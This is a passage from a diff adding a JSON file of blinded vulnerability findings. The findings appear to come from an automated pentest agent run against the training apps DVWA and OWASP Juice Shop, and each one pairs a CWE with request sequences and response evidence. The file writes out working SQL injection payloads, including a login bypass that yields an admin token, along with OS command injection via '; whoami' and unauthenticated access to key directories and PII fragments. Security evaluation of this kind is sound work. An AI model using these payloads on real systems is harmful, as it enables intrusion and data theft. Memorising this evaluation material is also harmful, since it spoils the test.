+    "response_evidence": "GET /api/Feedbacks without any authentication returned HTTP 200 with JSON body {\"status\":\"success\",\"data\":[...]} containing 8 feedback records. Several records include author identity linkage via numeric UserId (1, 2, 3, 21) paired with partially-masked but still disclosive email fragments embedded directly in the publicly-readable comment text, e.g.:\n- {\"UserId\":1,...,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\"}\n- {\"UserId\":2,...,\"comment\":\"Great shop! Awesome service! (***@juice-sh.op)\"}\n- {\"UserId\":3,...,\"comment\":\"Nothing useful available here! (***der@juice-sh.op)\"}\n- {\"UserId\":21,...,\"comment\":\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\"}\nThis confirms the endpoint requires no authentication yet discloses PII (email address fragments and their domain, correlated to specific numeric UserId values, enabling user identification/enumeration) — a CWE-359 exposure of private information to an unauthorized actor.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0101",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via unsanitized 'id' parameter in SQLi page (DVWA low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned 5 seeded user records, confirming boolean-based SQLi (unioned boolean short-circuits WHERE clause to always-true across all rows): ID: 1' OR '1'='1 First name: admin Surname: admin | ID: 1' OR '1'='1 First name: Gordon Surname: Brown | ID: 1' OR '1'='1 First name: Hack Surname: Me | ID: 1' OR '1'='1 First name: Pablo Surname: Picasso | ID: 1' OR '1'='1 First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 returned the empty result page with no 'First name'/'Surname' records at all (just 'User ID:' prompt). This differential TRUE(5 rows)/FALSE(0 rows) behavior confirms unsanitized string concatenation into SQL query.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0102",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "Product-Search SQL Injection (error-based and UNION-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/products/search?q=qwert' session=unauth -> HTTP 500",
+      "GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- session=unauth -> HTTP 200"
+    ],
+    "response_evidence": "First request (q=qwert') returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error' confirming the single quote broke out of the SQL query and raw database error is exposed. Second request with UNION payload (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with body: {\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"id\\\":1,\\\"name\\\":2,\\\"description\\\":3,\\\"price\\\":4,\\\"deluxePrice\\\":5,\\\"image\\\":6,\\\"createdAt\\\":7,\\\"updatedAt\\\":8,\\\"deletedAt\\\":9}]} -- the literal integers 1-9 supplied in the UNION SELECT were reflected directly into the JSON response fields (e.g. name=2, description=3), proving the attacker-controlled UNION SELECT was executed successfully by the backend and its column values returned verbatim, confirming exploitable SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0103",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated PII Exposure via GET /api/Feedbacks",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks HTTP/1.1\nAccept: application/json\n(no Authorization header, unauth session)"
+    ],
+    "response_evidence": "HTTP 200, content-type application/json. Response body is a JSON array of feedback records returned without any authentication. Each record links a UserId to a comment field that embeds a partially-masked but still personally-identifying email address fragment, e.g.:\\n- id:1, UserId:1 -> comment: \\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\"\\n- id:2, UserId:2 -> comment: \\\"Great shop! Awesome service! (***@juice-sh.op)\\\"\\n- id:3, UserId:3 -> comment: \\\"Nothing useful available here! (***der@juice-sh.op)\\\"\\n- id:4, UserId:21 -> comment: \\\"...(***ereum@juice-sh.op)\\\"\\nThese partial email addresses (domain + trailing local-part characters) are disclosed to an unauthenticated caller and are tied to specific UserId values, confirming PII exposure without authentication. Other records (UserId null) are explicitly marked (anonymous), contrasting with the identified/linked records that leak email fragments.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0104",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/session-input.php",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session-input id parameter (DVWA high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' OR '1'='1' #&Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' AND '1'='2' #&Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/"
+    ],
+    "response_evidence": "[security=high] Page confirms 'Security Level: high'. \n\nTRUE payload id=1' OR '1'='1' # submitted via session-input.php, then GET /vulnerabilities/sqli/ returned 5 seeded records bypassing the LIMIT 1 clause via UNION-free boolean OR (the trailing ' #' comments out the appended LIMIT 1 clause allowing all rows to surface through repeated single-row iteration/display logic):\n  ID: 1' OR '1'='1' # | First name: admin   | Surname: admin\n  ID: 1' OR '1'='1' # | First name: Gordon  | Surname: Brown\n  ID: 1' OR '1'='1' # | First name: Hack    | Surname: Me\n  ID: 1' OR '1'='1' # | First name: Pablo   | Surname: Picasso\n  ID: 1' OR '1'='1' # | First name: Bob     | Surname: Smith\n\nFALSE payload id=1' AND '1'='2' # submitted via session-input.php, then GET /vulnerabilities/sqli/ returned ZERO records (no pre_blocks, visible_text only shows the static page chrome with no First name/Surname entries), confirming the boolean-based differential behavior required for SQLi verification at high security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0105",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "DVWA OS Command Injection via unsanitized 'ip' field (semicolon chaining) [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ (dvwa_admin, security=low) body: ip=127.0.0.1; whoami&Submit=Submit"
+    ],
+    "response_evidence": "[security=low] Response body contains full ping output for 127.0.0.1 followed immediately by the injected command's output on its own line: \\\"...rtt min/avg/max/mdev = 0.024/0.032/0.045/0.008 ms\\\\nwww-data\\\". The literal string 'www-data' (the web server process identity) appearing appended after the ping statistics confirms the ';' chained 'whoami' command was executed server-side via shell command injection in the unsanitized 'ip' parameter.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0106",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated access to User Feedback records exposing PII (author emails)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /api/Feedbacks (unauth session, no Authorization header)"
+    ],
+    "response_evidence": "Unauthenticated GET /api/Feedbacks returned HTTP 200 with JSON array of feedback records, no auth required. Several comment fields embed partially-masked author email addresses in parentheses, e.g.: \\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\", \\\"Great shop! Awesome service! (***@juice-sh.op)\\\", \\\"Nothing useful available here! (***der@juice-sh.op)\\\", and \\\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : ... (***ereum@juice-sh.op)\\\". Records also expose UserId linking (UserId:1,2,3,21) alongside these emails. This confirms the endpoint discloses feedback author PII (email addresses) to unauthenticated clients, violating access control expectations (CWE-359).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0107",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "Product Search SQL Injection (error-based and UNION-based) via q parameter",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/products/search?q=qwert'  session=unauth -> HTTP 500, body: 'Error: SQLITE_ERROR: near \"'%'\": syntax error ... OWASP Juice Shop (Express ^4.17.1) 500 Error: SQLITE_ERROR...'",
+      "GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--  session=unauth -> HTTP 200, body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]}"
+    ],
+    "response_evidence": "A single unescaped quote in q=qwert' triggers a raw SQLite syntax error disclosed directly in the HTTP 500 response body ('SQLITE_ERROR: near \\\"'%'\\\": syntax error'), proving the q parameter is concatenated unsanitized into a backend SQL LIKE query. A crafted 9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- closes the open clauses/parens and successfully injects a literal row of integers into the result set, returned as HTTP 200 JSON with data containing the literal injected values (id:1,name:2,description:3,...,deletedAt:9) instead of real product data — definitive proof of exploitable UNION-based SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0108",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via unsanitized 'ip' parameter in DVWA Command Injection page [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ body: ip=127.0.0.1; whoami&Submit=Submit  (session=dvwa_admin, security=low)"
+    ],
+    "response_evidence": "[security=low] Response contained standard ping output for 127.0.0.1 (4 packets, 0% packet loss) immediately followed by the literal string 'www-data' on its own line at the end of the pre_blocks output -- i.e. the injected ';whoami' command executed server-side and returned the web server process's identity (www-data), confirming OS command injection via the 'ip' field with no sanitization of shell metacharacters at low security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0109",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "Product Search SQL Injection (error-based + UNION)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/products/search?q=qwert%27 (unauth)",
+      "GET /rest/products/search?q=x%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9-- (unauth)"
+    ],
+    "response_evidence": "Request 1 (q=qwert') returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error' — confirming the raw quote character broke the backend SQL query and is reflected unsanitized into a LIKE clause. Request 2 (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with JSON: {\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"id\\\":1,\\\"name\\\":2,\\\"description\\\":3,\\\"price\\\":4,\\\"deluxePrice\\\":5,\\\"image\\\":6,\\\"createdAt\\\":7,\\\"updatedAt\\\":8,\\\"deletedAt\\\":9}]} — demonstrating a successful 9-column UNION SELECT injection that closed the original query/subquery parentheses and appended a comment, returning attacker-controlled literal values (2,3,4,...,9) mapped directly into the product JSON fields. This confirms classic UNION-based SQL injection in the product search endpoint.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0110",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in id parameter of SQLi page [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit (session=dvwa_admin, security=low)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1'+AND+'1'='2&Submit=Submit (session=dvwa_admin, security=low)"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith). FALSE payload id=1' AND '1'='2 returned zero records (page showed only 'User ID:' label with no First name/Surname output). This confirms the id parameter is concatenated unsanitized into the backend SQL query, allowing boolean-based SQLi.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0111",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id (set out-of-band via session-input.php)",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via session-input.php id parameter (DVWA, high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  form_data: id=1' OR '1'='1' #  Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/  (dvwa_admin session)",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  form_data: id=1' AND '1'='2' #  Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/  (dvwa_admin session)"
+    ],
+    "response_evidence": "[security=high] At high security, the id parameter is no longer accepted directly on /vulnerabilities/sqli/; it must be set via POST to /vulnerabilities/sqli/session-input.php, which stores it in the PHP session. The underlying query appends LIMIT 1, requiring a trailing comment (#) to neutralize it and allow a boolean injection to return multiple rows.\n\nTRUE payload id=1' OR '1'='1' # => GET /vulnerabilities/sqli/ returned 5 full records (bypassing the LIMIT 1 restriction via the injected OR condition and trailing comment):\n  ID: 1' OR '1'='1' # | First name: admin  | Surname: admin\n  ID: 1' OR '1'='1' # | First name: Gordon | Surname: Brown\n  ID: 1' OR '1'='1' # | First name: Hack   | Surname: Me\n  ID: 1' OR '1'='1' # | First name: Pablo  | Surname: Picasso\n  ID: 1' OR '1'='1' # | First name: Bob    | Surname: Smith\n\nFALSE payload id=1' AND '1'='2' # => GET /vulnerabilities/sqli/ returned zero records (no <pre> result blocks, visible_text shows only the page chrome and 'Click here to change your ID' link, no ID/First name/Surname output).\n\nThis confirms classic SQL injection: the TRUE boolean condition returns multiple seeded user surnames while the FALSE condition returns none, demonstrating that the id value from session-input.php is concatenated unsanitized into the SQL query used by /vulnerabilities/sqli/ at security=high.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0112",
+    "target": "juiceshop",
+    "endpoint_url": "/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated Access to User Feedback Discloses PII (Email Addresses)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks HTTP/1.1 (unauth session, no Authorization header/cookie sent)"
+    ],
+    "response_evidence": "Request made with the 'unauth' session (no auth token) returned HTTP 200 with JSON body: {\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"UserId\\\":1,\\\"id\\\":1,\\\"comment\\\":\\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\",...},{\\\"UserId\\\":2,...,\\\"comment\\\":\\\"Great shop! Awesome service! (***@juice-sh.op)\\\"},{\\\"UserId\\\":3,...,\\\"comment\\\":\\\"Nothing useful available here! (***der@juice-sh.op)\\\"},{\\\"UserId\\\":21,...,\\\"comment\\\":\\\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : ... (***ereum@juice-sh.op)\\\"}, ...]}. The endpoint is fully unauthenticated yet discloses feedback records tied to UserId values along with partial email-address fragments embedded in comment text (PII), and overall record structure (UserId linkage) that an authenticated-only endpoint should protect. This confirms unauthenticated PII exposure per CWE-359.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0113",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in product search 'q' parameter (error-based and UNION-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/products/search?q=qwert%27 (session=unauth)",
+      "GET /rest/products/search?q=x%27%29%29+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9-- (session=unauth)"
+    ],
+    "response_evidence": "1) q=qwert' returned HTTP 500 with body containing: \\\"Error: SQLITE_ERROR: near \\\\\\\"'%'\\\\\\\": syntax error\\\" — proving the raw input is concatenated unsanitized into a backend SQL query, causing a syntax error (confirms injection point). 2) q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with body: {\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"id\\\":1,\\\"name\\\":2,\\\"description\\\":3,\\\"price\\\":4,\\\"deluxePrice\\\":5,\\\"image\\\":6,\\\"createdAt\\\":7,\\\"updatedAt\\\":8,\\\"deletedAt\\\":9}]}. The returned record's fields are literally the integer constants 1-9 supplied in the UNION SELECT (name=2, description=3, price=4, etc.), proving the attacker-controlled UNION query was executed by the backend and its result set returned directly to the client. This confirms exploitable SQL injection (CWE-89) via the q parameter.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0114",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "SQL Injection authentication bypass on /rest/user/login via crafted email field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /rest/user/login (session=unauth) json_body={\"email\": \"' OR 1=1--\", \"password\": \"anything\"}"
+    ],
+    "response_evidence": "HTTP 200 response body: {\\\"authentication\\\":{\\\"token\\\":\\\"[REDACTED_JWT]\\\",\\\"bid\\\":1,\\\"umail\\\":\\\"admin@juice-sh.op\\\"}}. The injected email value `' OR 1=1--` comments out the password check in the backend SQL query, causing the login logic to match the first row returned by the users table (umail=admin@juice-sh.op, the first/admin user), and a valid authentication JWT token was issued for that account despite supplying an arbitrary password. This confirms a classic SQLi authentication bypass (CWE-89) returning a valid token for the first user without knowing credentials.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0115",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential Acquisitions Memo Exposed via Open Directory Listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/  (Accept: text/html,application/json, session=unauth)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session=unauth)"
+    ],
+    "response_evidence": "Step 1: GET /ftp/ returned HTTP 200 with a browsable directory listing including the link/entry 'acquisitions.md 909 12/19/2023 1:12:12 PM' among other sensitive files (incident-support.kdbx, package.json.bak, suspicious_errors.yml, etc.). Step 2: GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body: \"# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year.\\nThis will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.\" This confirms unauthenticated disclosure of a confidential internal memo via an open/browsable directory with no access control.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0116",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA Command Injection page (ip parameter) - low security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1; whoami', Submit: 'Submit'} (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] Response output included standard ping results for 127.0.0.1 (4 packets transmitted, 0% packet loss) followed immediately by the injected command's output 'www-data' on its own line at the end of the <pre> block, confirming the unsanitized 'ip' field allows arbitrary OS command execution chained via ';' and that the web server process runs as the 'www-data' user.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0117",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/session-input.php",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via session-input.php out-of-band id parameter (DVWA high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' OR '1'='1' #&Submit=Submit  (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/  (session=dvwa_admin) -> reflects stored session id injected into query",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' AND '1'='2' #&Submit=Submit  (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/  (session=dvwa_admin) -> reflects stored session id injected into query"
+    ],
+    "response_evidence": "[security=high] Confirmed boolean-based SQLi via the out-of-band session-input.php -> sqli/ flow at DVWA high security level (page footer explicitly shows \"Security Level: high\" and \"Username: admin\").\n\nTRUE case payload id=1' OR '1'='1' # :\nGET /vulnerabilities/sqli/ returned 5 full records (multiple seeded user surnames), confirming the injected OR condition bypassed the intended single-row WHERE id=... LIMIT 1 clause:\n  ID: 1' OR '1'='1' #  First name: admin    Surname: admin\n  ID: 1' OR '1'='1' #  First name: Gordon   Surname: Brown\n  ID: 1' OR '1'='1' #  First name: Hack     Surname: Me\n  ID: 1' OR '1'='1' #  First name: Pablo    Surname: Picasso\n  ID: 1' OR '1'='1' #  First name: Bob      Surname: Smith\n\nFALSE case payload id=1' AND '1'='2' # :\nGET /vulnerabilities/sqli/ returned zero records -- page body contained no \"First name:\"/\"Surname:\" output blocks at all (only the static \"Click here to change your ID\" prompt), proving the injected AND-false condition suppressed all rows.\n\nThe contrast (5 rows for TRUE vs 0 rows for FALSE) with identical quote/comment-based payload structure required at high security (trailing '#' comment to neutralize the appended LIMIT 1) demonstrates confirmed SQL injection distinct from the low/medium instances.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0118",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search?q=",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in Product Search (error-based + UNION-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/products/search?q=qwert%27",
+      "GET http://juiceshop:3000/rest/products/search?q=x%27%29%29%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9--"
+    ],
+    "response_evidence": "Request 1 (single quote q=qwert'): HTTP 500 with body 'Error: SQLITE_ERROR: near \"\\'%\\'\": syntax error' confirming raw string concatenation into SQL query (error-based SQLi proof). Request 2 (UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--): HTTP 200 with JSON body {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — attacker-controlled UNION SELECT of literal integers returned as a product row with all 9 columns correctly aligned, proving successful UNION-based SQL injection against the underlying Sequelize/SQLite query.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0119",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Login Authentication-Bypass SQL Injection grants admin token",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /rest/user/login as unauth with json_body {\"email\": \"' OR 1=1--\", \"password\": \"anything\"} -> 200, response: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    ],
+    "response_evidence": "Submitting email=\\\"' OR 1=1--\\\" with an arbitrary password to POST /rest/user/login (no prior authentication) returns HTTP 200 with a valid authentication object: {\\\"authentication\\\":{\\\"token\\\":\\\"[REDACTED_JWT]\\\",\\\"bid\\\":1,\\\"umail\\\":\\\"admin@juice-sh.op\\\"}}. The 'umail' field confirms the issued JWT token is bound to the first seeded user account, admin@juice-sh.op (basket id 1), proving the classic SQL injection comment-based bypass ('OR 1=1--) defeats the login WHERE clause and authenticates as the admin account without knowing its password.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0120",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated Exposure of User Feedback Records with Author Email/PII and UserId Linkage",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks [unauth, no Authorization header/session cookie]"
+    ],
+    "response_evidence": "GET /api/Feedbacks without any authentication token returned HTTP 200 with content-type application/json and a full array of feedback records, e.g.:\n{\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",\"rating\":5,...}\n{\"UserId\":21,\"id\":4,\"comment\":\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\",\"rating\":1,...}\n\nThe endpoint is reachable with zero authentication and discloses: (1) partial author email addresses embedded in the comment text (domain 'juice-sh.op' plus trailing local-part characters, e.g. '***in@juice-sh.op', '***ereum@juice-sh.op', '***der@juice-sh.op'), and (2) the numeric UserId foreign key directly associating each comment/rating with an internal user account identifier. This combination (partially unmasked email fragments + UserId linkage) returned to an unauthenticated caller constitutes disclosure of personally identifiable information without any access control (CWE-359), consistent with the known Juice Shop improper-PII-handling flaw on the public feedback API.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0121",
+    "target": "juiceshop",
+    "endpoint_url": "/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption-Keys Directory listing reveals premium.key and jwt.pub",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ (unauth, Accept: text/html,application/json) -> HTTP 200 directory listing"
+    ],
+    "response_evidence": "GET /encryptionkeys/ returned HTTP 200 (content-type text/html) with a serve-index style directory listing, visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links present: http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the directory is browsable without authentication and exposes sensitive cryptographic key files (JWT public key and premium feature signing key) by filename, satisfying the CWE-548 verification criteria.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0122",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via numeric boolean bypass in id POST field (DVWA SQLi, medium security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/  form_data={id: '1 OR 1=1', Submit: 'Submit'}  [security=medium]",
+      "POST http://dvwa/vulnerabilities/sqli/  form_data={id: '1 AND 1=2', Submit: 'Submit'}  [security=medium]"
+    ],
+    "response_evidence": "[security=medium] Confirmed server-side SQL injection via numeric boolean payload (quotes are escaped at medium level, so unquoted numeric OR/AND injection used). TRUE payload id=1 OR 1=1 returned ALL 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) -- confirmed via page visible_text: \"ID: 1 OR 1=1 First name: admin Surname: admin ... First name: Gordon Surname: Brown ... First name: Hack Surname: Me ... First name: Pablo Surname: Picasso ... First name: Bob Surname: Smith\". FALSE payload id=1 AND 1=2 returned zero records (no \"ID:\" result blocks in response, only the static User ID selector). Session confirmed at security_level=medium via session_info field in both responses. This demonstrates the backend query is still vulnerable to injection despite quote-escaping, since numeric/unquoted injection is unaffected by the quote-escape mitigation.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0123",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQLi page (security=medium) via numeric boolean payload in POST id field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/security.php (session=dvwa_admin) -> confirmed security_level=medium",
+      "POST http://dvwa/vulnerabilities/sqli/ body: id=1 OR 1=1&Submit=Submit (session=dvwa_admin)",
+      "POST http://dvwa/vulnerabilities/sqli/ body: id=1 AND 1=2&Submit=Submit (session=dvwa_admin)"
+    ],
